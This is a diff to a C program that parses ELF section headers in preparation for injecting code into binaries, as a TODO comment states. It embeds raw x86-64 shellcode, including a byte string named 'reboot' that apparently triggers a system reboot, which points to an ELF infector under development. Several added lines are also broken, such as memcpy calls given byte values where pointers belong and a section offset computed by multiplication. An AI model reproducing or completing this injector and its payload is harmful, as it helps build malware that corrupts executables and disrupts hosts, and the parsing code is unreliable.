@@ -8,6 +8,7 @@
 #include <string.h>
 
 #define SHOFF 0x24
+#define SHNUM 0x3c
 #define SHSTRINX 0x3E
 
 const char reboot[] = "\xBF\xAD\xDE\xE1\xFE\xBE\x69\x19\x12\x28\xBA\x67\x45\x23\x01\x45\x31\xD2\xB8\xA9\x00\x00\x00\x0F\x05";
@@ -18,8 +19,6 @@ const char program_header[] = "\x01\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00\
 const char Hello_word[]  = "\xB8\x01\x00\x00\x00\xBF\x01\x00\x00\x00\x48\x8D\x35\x10\x00\x00\x00\xBA\x0D\x00\x00\x00\x0F\x05\xB8\x3C\x00\x00\x00\x31\xFF\x0F\x05helloworld\n";
 
 
-/* to navigate the ELF file structure 
-	you have to read the */
 int browse_header(char *target){
 
 	int flag = S_IRWXU | S_IRWXO; 
@@ -38,10 +37,14 @@ int browse_header(char *target){
 	}
 
 	
+	unsigned char sh_strsym[64] = {0};
 	unsigned char cpy[size+1];
 	memset(cpy,0,size+1);
 
-	if(read(fd,cpy,size) == -1) goto end;
+	if(read(fd,cpy,size) == -1){
+		close(fd);
+		return -1;
+	}
 
 	close(fd);
 	fd = -1;
@@ -57,33 +60,19 @@ int browse_header(char *target){
 	memcpy(&str_symbol_index,&cpy[SHSTRINX],sizeof(uint16_t));
 
 	off_t str_symbol_table_data_off = section_header_start * (str_symbol_index * 64);
+	memcpy(sh_strsym,&cpy[str_symbol_table_data_off],64);
 	
+	off_t sh_strtbl_off = 0;	
+	size_t sh_strtbl_sz = 0;
+	memcpy(&sh_strtbl_off,sh_strsym[0x18],8);
+	memcpy(&sh_strtbl_sz,sh_strsym[0x38],8);
 	
+	unsigned char strtbl[sh_strtbl_sz+1];
+	memset(strtbl,0,sh_strtbl_sz+1);
+	memcpy(strtbl,&cpy[sh_strtbl_off],sh_strtbl_sz);
 	
-	int i = 0, j = 0;
-	while(i < size){
-		if(cpy[i] == '\n'){
-			i++;
-			continue;
-		}
-		b[j++] = cpy[i++]; 
-	}
+	/*TODO: read section header to understand where to inject the code*/
 	
-	memset(cpy,0,size+1);
-	for(i = 0,j=0; i < size; i += 2, j++){	
-		
-		char a[5] = {0};
-		a[0] = '0';
-		a[1] = 'x';
-		memcpy(&a[2],&b[i],2);
-		errno = 0;
-		uint16_t x = (uint16_t)strtol(a,NULL,16);
-		if(errno == EINVAL || errno == ERANGE);
-		memcpy(&cpy[j],&x,1);
-	}
-	
-	if(write(*target,cpy,size) == -1) goto end;
-
 	close(fd);
 	return 0;
 
